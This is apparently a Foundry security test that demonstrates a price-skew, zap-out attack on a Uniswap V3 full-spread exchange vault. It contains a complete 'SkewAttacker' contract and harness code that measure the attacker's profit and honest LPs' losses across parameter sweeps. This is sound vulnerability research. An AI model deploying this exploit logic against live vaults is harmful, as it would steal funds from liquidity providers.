// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IUniswapV3Pool} from "@crane/contracts/protocols/dexes/uniswap/v3/interfaces/IUniswapV3Pool.sol";
import {FullMath} from "@crane/contracts/protocols/dexes/uniswap/libraries/FullMath.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {IStandardExchangeInMulti} from "contracts/interfaces/IStandardExchangeInMulti.sol";
import {IStandardExchangeOutMulti} from "contracts/interfaces/IStandardExchangeOutMulti.sol";
import {IUniswapV3FullSpreadStandardExchangeVaultLiquidReserve as ILR} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v3/interfaces/IUniswapV3FullSpreadStandardExchangeVaultLiquidReserve.sol";
import {V3FSFixture} from "./V3FSFixtureCopy.sol";

/// Unprivileged attacker: plain contract, only public vault entry points + a direct pool swap.
contract SkewAttacker {
    address immutable owner;
    IUniswapV3Pool immutable pool;
    IStandardExchangeProxy immutable vault;
    IERC20 immutable t0;
    IERC20 immutable t1;

    constructor(IUniswapV3Pool p, IStandardExchangeProxy v) {
        owner = msg.sender;
        pool = p;
        vault = v;
        t0 = IERC20(p.token0());
        t1 = IERC20(p.token1());
        t0.approve(address(v), type(uint256).max);
        t1.approve(address(v), type(uint256).max);
        IERC20(address(v)).approve(address(v), type(uint256).max);
    }

    /// Whole attack in ONE call (atomic, one tx).
    /// dual: book-neutral dual deposit size (becomes majority holder); skew1: single-sided token1 zap-in;
    /// zapBps: fraction of own shares zapped out to token0 (idle exact-in); then swap the pool back to sp0.
    function attack(uint256 dual, uint256 skew1, uint256 zapBps, uint160 sp0) external {
        require(msg.sender == owner);
        if (dual > 0) {
            address[] memory toks = new address[](2);
            toks[0] = address(t0);
            toks[1] = address(t1);
            uint256[] memory a = new uint256[](2);
            a[0] = dual;
            a[1] = dual;
            IStandardExchangeInMulti(address(vault)).exchangeInManyToOne(toks, a, IERC20(address(vault)), 0, address(this), false, block.timestamp);
        }if (skew1 > 0) vault.exchangeIn(t1, skew1, IERC20(address(vault)), 0, address(this), false, block.timestamp);
        uint256 sh = IERC20(address(vault)).balanceOf(address(this)) * zapBps / 10_000;if (sh > 0) vault.exchangeIn(IERC20(address(vault)), sh, t0, 0, address(this), false, block.timestamp);
        _swapTo(sp0);
    }

    /// pro-rata exit of the remaining shares at P0 (exact-out of both legs, book-proportional amounts)
    function exitRest(uint256 s, uint256[] calldata outs) external {
        require(msg.sender == owner);
        address[] memory toks = new address[](2);
        toks[0] = address(t0);
        toks[1] = address(t1);
        IStandardExchangeOutMulti(address(vault)).exchangeOutOneToMany(IERC20(address(vault)), s, toks, outs, address(this), false, block.timestamp);
    }

    function _swapTo(uint160 target) internal {
        (uint160 sp,,,,,,) = pool.slot0();
        if (sp == target) return;
        bool z = target < sp;
        uint256 bal = z ? t0.balanceOf(address(this)) : t1.balanceOf(address(this));
        pool.swap(address(this), z, int256(bal), target, "");
    }

    function uniswapV3SwapCallback(int256 a0, int256 a1, bytes calldata) external {
        require(msg.sender == address(pool));
        if (a0 > 0) t0.transfer(msg.sender, uint256(a0));
        if (a1 > 0) t1.transfer(msg.sender, uint256(a1));
    }
}

contract SkewZapOutJitTest is V3FSFixture {
    bytes32 constant MINT_T = keccak256("Mint(address,address,int24,int24,uint128,uint256,uint256)");
    bytes32 constant BURN_T = keccak256("Burn(address,int24,int24,uint128,uint256,uint256)");
    bytes32 constant SWAP_T = keccak256("Swap(address,address,int256,int256,uint160,uint128,int24)");

    SkewAttacker atkr;
    IERC20 t0;
    IERC20 t1;
    uint256 constant CAP = 40_000 ether; // attacker own capital per token (unused remainder stays as balance)

    function setUp() public override {
        super.setUp(); // genesis: passive 1000/1000, 3 honest LPs 300/300, handler-actor LP 200/200, keeper rebalance
        t0 = IERC20(pool.token0());
        t1 = IERC20(pool.token1());
        atkr = new SkewAttacker(pool, vault);
        ERC20PermitMintableStub(address(t0)).mint(address(atkr), CAP);
        ERC20PermitMintableStub(address(t1)).mint(address(atkr), CAP);
    }

    function _victims() internal view returns (uint256 v) {
        v = h.valueOf(address(h.passive())) + h.valueOf(address(h.hon(0))) + h.valueOf(address(h.hon(1)))
            + h.valueOf(address(h.hon(2))) + h.valueOf(address(h.atk())); // h.atk is just another honest LP here
    }

    function _atkValue() internal view returns (uint256) {
        return h.valueOf(address(atkr)); // t0 + t1 + shares * NAV(P0) / S
    }

    function _exitRest() internal {
        uint256 bal = IERC20(address(vault)).balanceOf(address(atkr));
        if (bal == 0) return;
        (uint256 r0, uint256 r1) = h.book();
        uint256 S = IERC20(address(vault)).totalSupply();
        uint256[] memory outs = new uint256[](2);
        uint256 s = bal;
        for (uint256 i; i < 64 && s > 0; ++i) {
            outs[0] = s * r0 / S;
            outs[1] = s * r1 / S;
            if (FullMath.mulDivRoundingUp(outs[0], S, r0) == s && FullMath.mulDivRoundingUp(outs[1], S, r1) == s) break;
            --s;
        }
        atkr.exitRest(s, outs);
    }

    function _run(uint256 dual, uint256 skew1, uint256 zapBps, bool dump) internal returns (int256 profit, int256 vloss) {
        uint160 sp0 = h.sp0();
        uint256 a0v = _atkValue();
        uint256 v0 = _victims();
        if (dump) vm.recordLogs();
        atkr.attack(dual, skew1, zapBps, sp0);
        if (dump) _dump();
        (uint160 sp,,,,,,) = pool.slot0();
        assertEq(uint256(sp), uint256(sp0), "attacker restored price itself");
        _exitRest(); // realise the remainder pro-rata at P0
        (sp,,,,,,) = pool.slot0();
        assertEq(uint256(sp), uint256(sp0), "still at P0");
        profit = int256(_atkValue()) - int256(a0v);
        vloss = int256(v0) - int256(_victims());
        console2.log("dual / skew1 / zapBps", dual, skew1, zapBps);
        console2.log("  ATTACKER NET PROFIT at P0 (wei)", profit);
        console2.log("  HONEST LP LOSS at P0 (wei)", vloss);
        console2.log("  attacker residual shares", IERC20(address(vault)).balanceOf(address(atkr)));
    }

    function _dump() internal {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter != address(pool)) continue;
            bytes32 t = logs[i].topics[0];
            if (t == MINT_T && address(uint160(uint256(logs[i].topics[1]))) == address(vault)) {
                (, uint128 L, uint256 a0, uint256 a1) = abi.decode(logs[i].data, (address, uint128, uint256, uint256));
                console2.log("  [ev] VAULT MINT L / a0 / a1", uint256(L), a0, a1);
            } else if (t == BURN_T && address(uint160(uint256(logs[i].topics[1]))) == address(vault)) {
                (uint128 L, uint256 a0, uint256 a1) = abi.decode(logs[i].data, (uint128, uint256, uint256));
                console2.log("  [ev] VAULT BURN L / a0 / a1", uint256(L), a0, a1);
            } else if (t == SWAP_T) {
                (int256 a0, int256 a1, uint160 sp,,) = abi.decode(logs[i].data, (int256, int256, uint160, uint128, int24));
                console2.log("  [ev] SWAP by", address(uint160(uint256(logs[i].topics[1]))) == address(vault) ? "VAULT" : "ATTACKER");
                console2.log("       amount0", a0);
                console2.log("       amount1", a1);
                console2.log("       sqrtP after (x1e6 / 2^96)", uint256(sp) * 1e6 >> 96);
            }
        }
    }

    // ---- main PoC: replay-shaped parameters (fuzzer: atk ~10.1k of 13.0k shares, ~18k free token1 skew)
    function test_poc_skewZapOutJit_main() public {
        assertTrue(ILR(address(vault)).canOpenBoundPoolOps(), "idle mode (no blocked/callback path)");
        (int256 p, int256 l) = _run(1500 ether, 16_000 ether, 6_700, true);
        assertGt(p, 0, "attacker profits");
        assertGt(l, 0, "honest LPs lose");
    }

    // ---- controls
    function test_control_noSkew() public { _run(1500 ether, 0, 10_000, false); }
    function test_control_skewNoZap_dualExit() public { _run(1500 ether, 16_000 ether, 0, false); }

    // ---- sweeps
    function test_sweep_skew4k() public { _run(1500 ether, 4_000 ether, 10_000, false); }
    function test_sweep_skew8k() public { _run(1500 ether, 8_000 ether, 10_000, false); }
    function test_sweep_skew30k() public { _run(1500 ether, 30_000 ether, 10_000, false); }
    function test_sweep_noDual_skew16k() public { _run(0, 16_000 ether, 10_000, false); }
    function test_sweep_zap100pct_skew16k() public { _run(1500 ether, 16_000 ether, 10_000, false); }
    function test_sweep_zap50pct() public { _run(1500 ether, 16_000 ether, 5_000, false); }
    function test_sweep_zap80pct() public { _run(1500 ether, 16_000 ether, 8_000, false); }
    function test_sweep_skew10k_zap67() public { _run(1500 ether, 10_000 ether, 6_700, false); }
    function test_sweep_skew6k_zap100() public { _run(1500 ether, 6_000 ether, 10_000, false); }
}
